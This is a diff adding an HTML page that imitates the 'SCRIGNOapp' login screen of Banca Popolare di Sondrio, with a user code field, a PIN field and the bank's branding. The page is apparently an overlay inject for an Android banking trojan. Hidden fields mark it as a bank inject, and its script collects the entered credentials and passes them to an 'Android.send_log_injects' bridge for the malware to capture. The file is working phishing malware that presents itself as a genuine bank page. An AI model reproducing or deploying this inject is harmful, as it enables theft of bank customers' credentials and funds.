@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>SCRIGNOapp</title>
+</head>
+<body>
+
+<style type="text/css">
+	body {
+		background: #10c4db;
+		margin: 0;
+		padding: 0;
+		font-family: Helvetica, sans-serif;
+	}
+	.logo {
+		background: #003b5c;
+		text-align: center;
+	}
+	.form {
+		text-align: center;
+		padding-top: 70px;
+	}
+	.form label {
+		display: block;
+	}
+	form {
+		display: inline-block;
+	}
+fieldset {
+	  position: relative;
+	  text-align: center;
+	  border: none;
+	  margin-top: 40px;
+}
+
+input[type="text"],input[type="password"] {
+    left: 0;
+    right: 0;
+    width: 80%;
+    border: 1px solid #fafafa;
+    background: none;
+    border-radius: 15px;
+    height: 30px;
+    margin: 5px;
+    padding-left: 10px;
+    color: #fff;
+    outline: none;
+    -webkit-appearance: none;
+}
+input[type="button"] {
+    left: 0;
+    right: 0;
+    width: 81%;
+    height: 32px;
+    margin: 5px;
+    border-radius: 15px;
+    color: #fff;
+    outline: none;
+    background: #4dd4e5;
+    border: none;
+    font-weight: 600;
+    font-size: 15px;
+    -webkit-appearance: none;
+}
+input::placeholder {
+	color: #f1f1f1;
+}
+fieldset span {
+	display: inline-block;
+    width: 80%;
+    text-align: left;
+    color: #c5f8ff;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+	/* прячем стандартный чекбокс */
+input[type="checkbox"] {
+    display: none;
+}
+
+/* стили для метки */
+input[type="checkbox"] + label {
+    cursor: pointer;
+    padding-left: 50px;
+    position: relative;
+    font-family: tahoma, sans-serif, arial;
+    line-height: 40px;
+}
+
+/* стили для поля с бегунком*/
+input[type="checkbox"] + label::before {
+    content: "";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    left: 0;
+    vertical-align: middle;
+    padding: 0;
+    height: 24px;
+    width: 45px;
+    margin: 0 5px 0 0;
+    border: 1px solid #dadada;
+    border-radius: 12px;
+    background: #dddddd;
+}
+
+/* стили для бегунка*/
+input[type="checkbox"] + label::after {
+    content: "";
+    display: block;
+    position: absolute;
+    top: 1px;
+    left: 1px;
+    width: 22px;
+    height: 22px;
+    border-radius: 22px;
+    background: #fff;
+    border: 1px solid #dadada;
+    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
+}
+
+/* плавность )) */
+input[type="checkbox"] + label::before,
+input[type="checkbox"] + label::after {
+    -webkit-transition: all .2s ease-out;
+    transition: all .2s ease-out;
+}
+
+/* чекнутое состояние )) */
+input[type="checkbox"]:checked + label::before {
+    background: #6edc5f;
+    border-color: #6dd75e;
+}
+input[type="checkbox"]:checked + label::after {
+    left: 22px;
+}
+fieldset p {
+	    display: inline-block;
+    text-align: left;
+    left: 0;
+    right: 0;
+    border: 1px solid #6fcbd8;
+    padding: 30px;
+    border-radius: 50px;
+    background: #6fcbd8;
+}
+#footer {
+	position: relative;
+}
+#copyright {
+    position: absolute;
+    bottom: 0px;
+    left: 0;
+    right: 0;
+    background: #16b0c4;
+    color: #c5f8ff;
+    padding: 10px;
+}
+</style>
+
+<div class="logo">
+	<img src="data:image/png;base64,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">
+</div>
+
+<fieldset id="formtosend">
+		<label style="display: block; color: #fff;">BENVENUTO</label>
+		<input type="text" placeholder="Codice utente" name="codiceutente">
+		<input type="password" placeholder="PIN" name="pin" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+		<input type="button" onclick="send_form()" name="sumbit" value="ACCEDI">
+
+		<span>Nascondi dati home page</span>
+        <input name="type_injects" value='banks' type="hidden" required>
+        <input name="closed" value='close_activity_injects' type="hidden" required>
+		<input id="checkbox1" name="sumbit" type="checkbox">
+		<label for="checkbox1"></label>
+</fieldset>
+
+<fieldset>
+	<div class="icons">
+		<p style="float: left;">
+			<img src="data:image/png;base64,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" width="50">
+		</p>
+		<p style="float: right;">
+			<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA9CAYAAADxoArXAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAARcSURBVGhD7ZrZTxNRFMb9j0VxwbhEJRqNu7gmKir64IvGHTXRuMQlooIKtFAWu7AWKKUbhXI8X5mG6fS00zuduWXpl/yeeu7MfJ0759xt2/bvPtpKNAxvdjw33MQc6g7Q6d5RuuIP0c1AmG4PRegOcysQoesDIbrQ/49afw/Rnp8D4jXcxHXDO7p8tO/XYN5c18w8pZZzVK1yK0ThZIaehKbocM8Q7frhF+9RC64aPtM3Sv2xBMWzy4YF51pi92OpDD0KTlIT/4nS/ZzgiuGj3B2/TMeMR3VfETZ+0fdPvLcqNRs+/meE0grdthbdHx4Xn0GFmgxf5YSTXLLvvgscMxBP0jfuBW/HZ6gzEqWXzOuxKL2fnKNfM3EKJdOUxUdcQRn+Y9s52UnPUi2ODe/nxBTNZI1HKdbSygqNJtL0PDzNPWBYbC/R3OXnZBfM/zFzi0vG1YqF3oRPSGpfDY4MI4kML6SMRyhWgt8mysxOfnipbbW0cIn6M7dgXLVYn6fmxDbV4MjweTa0zG/RKt98gg5yzZXaOAE1/N3ErHH1NeHexxR6jhlHhr9H541brwn1c0eNb1WimWvxOGdpqzr5+5fi7VA23PJzUHy7GDFJ8W7QxiXJekf/fFKMtUPZcMfwmHHLNSHDYoQlxbvBge5BHswUJ7FZTmpSrB3Khj9ywrDqHv8JUqxbIAFOpBeNu60qx73MSWJUNtzLQ0ezUIJafztLICr0xkozNiYkUmwllA2PWMoRypCbmbkcHyZLs/XdIfWepWQYZQLjWrNi/G1hECLFu8mLyLRxxzU9Ck6JsZVQNuzj7IgRVgEMQDBIkOLdBFNGq145KE3KXbpePORpolUYl0uxldgwhp/xuNwqTECk2EpsCMOrn1JxdYA6HEwXN4RhlD3rNBQzyUM96tVh3RveywlRGktjICLF27FuDaMbX/WHSspgQVg8kNrZse4Mw+gRnuB/nY6VTBgKii5m829eam/HujKMOS6SU6Wl3cVcjk45GFIWqLthzKEv+YL5dS1p2mkWBjqIla5TLXU1jBEaFuvthL8hnErndzCk66hQN8OX/cGyC3VmzfD32h6IuLYLURfD2F/CfLac8Auy81MeXTlNTuXQbnj3jwGbpLRC1zxcLtJqGCWnZzZuWCsW9pGwm+jFBpoZrYYxb8aCgVnovlh/1jHFBFoNo86ijpq1urwrx3uBVsMn/o6U7B/1zC6IsV6h1fBJNox9X7O6+ZuWYr2iYdhLGoZZDcMe0zDsJQ3DrE1tGKftAvFkfn+qwJsx9cX0WtBqGGAYaQYTCinOK7QbrjcNwzrAKaAbgbDrqxnVoNUwjJoPs2V5qoh9XynWK7QZxnkMadEORQrlSmrjBdoM42hxOX2YdH6yThVths9WMPyphqOEqmgzjIOjqeXSk7fo0vi2pTZeoDVptfmClLGsaeEspRTrFVoNA5yqezA6QY9DU3SuT9+bLaDdcL1pGN7sbDHDPvoPJM5m6f9OQkAAAAAASUVORK5CYII=" width="50">
+		</p>
+	</div>
+</fieldset>
+<br><br>
+	<div id="footer">
+		<div id="copyright">Banca Popolare di Sondrio - P.IVA 00053810149</div>
+	</div>
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        send_log_injects : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.send_log_injects( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
